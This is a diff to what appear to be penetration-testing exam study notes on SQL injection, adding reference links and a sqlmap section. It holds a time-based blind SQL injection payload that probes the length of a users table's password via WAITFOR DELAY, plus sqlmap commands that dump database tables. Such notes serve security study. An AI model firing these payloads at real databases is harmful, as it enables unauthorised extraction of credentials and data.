@@ -1,6 +1,10 @@
-#### Cheat Sheat
+#### References
 
 - https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/
+- https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet
+- https://medium.com/@notsoshant/a-not-so-blind-rce-with-sql-injection-13838026331e
+- https://notchxor.github.io/oscp-notes/2-web/sqli/
+- https://www.asciitable.com/
 
 #### Blind SQL Injections
 
@@ -28,3 +32,14 @@ use the waiting time to determine whether the conditional equation is valid
 -- check column length
 '; IF (select LEN(password) from users) = 64 WAITFOR DELAY '00:00:05' --
 ```
+
+#### sqlmap (:no_entry:Cannot be used in the exam)
+
+```
+sqlmap -u "url" --dump -C "columns" -T "tables" -D "database" 
+sqlmap -r post.txt --dump -C "columns" -T "tables" -D "database"
+```
+
+post.txt = request contents
+
+![image]()
